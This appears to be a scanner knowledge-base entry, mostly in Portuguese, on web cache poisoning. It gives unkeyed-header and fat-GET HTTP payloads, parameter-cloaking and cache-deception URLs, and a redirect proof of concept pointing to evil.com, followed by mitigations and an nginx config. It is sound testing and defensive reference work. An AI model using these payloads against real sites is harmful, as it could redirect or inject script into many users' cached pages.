---
id: cache_poisoning
title: "Web Cache Poisoning"
module: "cachepoisoning"
severity: "HIGH"
cwe_id: "CWE-524"
cwe_title: "Use of Cache Containing Sensitive Information"
cvss_vector: "AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N"
vrt_id: "server_security_misconfiguration.web_cache_poisoning"
---

## Summary
Headers ou parâmetros não incluídos na chave de cache são refletidos na resposta e armazenados, fazendo com que outras vítimas recebam conteúdo envenenado (XSS, redirect, script malicioso).

## Description
CDNs, reverse proxies e frameworks armazenam respostas para reduzir latência. A chave de cache normalmente inclui método, host, path e query string, mas não headers como `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Forwarded-Proto`, `X-Original-URL` ou `X-Forwarded-Prefix`. Se a aplicação usa esses headers para gerar links, redirects ou conteúdo, o atacante pode envenenar a entrada cacheada.

Variantes:
- **Unkeyed header poisoning:** `X-Forwarded-Host: evil.com` refletido em links/canonical.
- **Unkeyed parameter/query:** parâmetro não incluído na chave (ex.: `?utm_source=`) refletido.
- **Fat GET:** body em GET usado pela aplicação, mas ignorado pela chave de cache.
- **Parameter cloaking:** `?cb=1&utm=evil` vs `?cb=1%26utm=evil` com parsers diferentes.
- **Cache deception:** cache armazena resposta autenticada sob URL pública (`.css`, `.jpg`).
- **Host header + cache:** combinação com Host Header Injection.
- **Response splitting + cache:** CRLF para injetar headers/corpo cacheado.

O ataque é especialmente grave quando a resposta envenenada é servida na página inicial ou em um path popular, atingindo muitas vítimas.

## Impact
- XSS armazenado em cache, afetando todos os usuários do path.
- Redirecionamento em massa para phishing/malware.
- Distribuição de conteúdo falso e desinformação.
- Vazamento de respostas autenticadas via cache deception.
- Negação de serviço e corrupção de cache.
- Impacto HIGH; CRITICAL se atingir login/admin ou vazar sessões.

## Payloads and Bypasses
```http
GET /?cb=1337 HTTP/1.1
Host: alvo.com
X-Forwarded-Host: evil.com
```

```http
GET /?cb=1337 HTTP/1.1
Host: alvo.com
X-Forwarded-Scheme: nothttps
X-Forwarded-Proto: http
```

```http
GET /?cb=1337 HTTP/1.1
Host: alvo.com
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-Prefix: /evil
```

```text
# Headers não-keyed comuns
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: nothttps
X-Forwarded-Proto: http
X-Forwarded-Port: 443
X-Forwarded-Prefix: /evil
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Host: evil.com
X-Forwarded-Server: evil.com
Forwarded: host=evil.com

# Cache busters para não envenenar a entrada real durante testes
?cb=1337
?cachebust=abc123
?utm_source=test

# Fat GET
GET /?cb=1 HTTP/1.1
Host: alvo.com
Content-Length: 38

utm_source=<script>alert(1)</script>

# Parameter cloaking / parser diferencial
?cb=1&utm=evil
?cb=1%26utm=evil
?cb=1;utm=evil
?cb=1&utm=evil&utm=good
```

PoC de envenenamento de redirect:
```http
GET /login?cb=1337 HTTP/1.1
Host: alvo.com
X-Forwarded-Host: evil.com

# Resposta cacheada:
HTTP/1.1 301 Moved Permanently
Location: https://evil.com/login
```

Cache deception:
```text
https://alvo.com/account/profile.css
https://alvo.com/account/profile.jpg
https://alvo.com/account/profile%2ecss
https://alvo.com/account/profile.css?cb=1
```

Casos reais e mentalidade de ataque (RWBH): HackerOne e Shopify (`X-Forwarded-Host`) mostraram envenenamento de cache em páginas públicas; o atacante procura headers não-keyed, fat GET e parâmetros clandestinos.

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `cb`, `cachebust`, `utm_*`, `lang`, `theme`, `callback`, `_`, `v`.
- **Headers comuns:** `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Forwarded-Scheme`, `X-Forwarded-Port`, `X-Forwarded-Prefix`, `X-Original-URL`, `X-Rewrite-URL`, `X-Host`, `Forwarded`.
- **Paths comuns:** `/`, `/login`, `/home`, `/search`, `/api/*`, `/assets/*`, `/static/*`, páginas públicas com cache.
- **Sinais:** `X-Cache: HIT`, `Age`, `CF-Cache-Status`, `Cache-Control: public`; headers refletidos em links/canonical; `Vary` ausente.

## Recommendation
1. Incluir todos os headers que influenciam a resposta na chave de cache (`Vary: X-Forwarded-Host, X-Forwarded-Proto`) ou, melhor, não usá-los para gerar conteúdo.
2. Normalizar e validar headers de forwarding no edge; descartar valores do cliente.
3. Nunca cachear respostas autenticadas ou com `Set-Cookie`; usar `Cache-Control: private, no-store` para dados de usuário.
4. Canonicalizar URL/query e rejeitar parâmetros desconhecidos; garantir que proxy e aplicação usem o mesmo parser.
5. Desabilitar fat GET ou incluir o body na chave; limitar métodos cacheáveis a GET/HEAD.
6. Aplicar cache deception protection: não cachear por extensão; validar `Content-Type` e autenticação antes do cache.
7. Configurar o CDN para remover headers hop-by-hop e não confiar em `X-Original-URL`/`X-Rewrite-URL`.
8. Exemplo Nginx:
```nginx
proxy_cache_key "$scheme$request_method$host$request_uri";
proxy_ignore_headers X-Accel-Expires;
proxy_hide_header X-Forwarded-Host;
add_header Vary "X-Forwarded-Host, X-Forwarded-Proto" always;
proxy_cache_bypass $http_authorization $cookie_session;
```
9. Monitorar envenenamento com canários e alertar sobre respostas que contenham hosts externos.
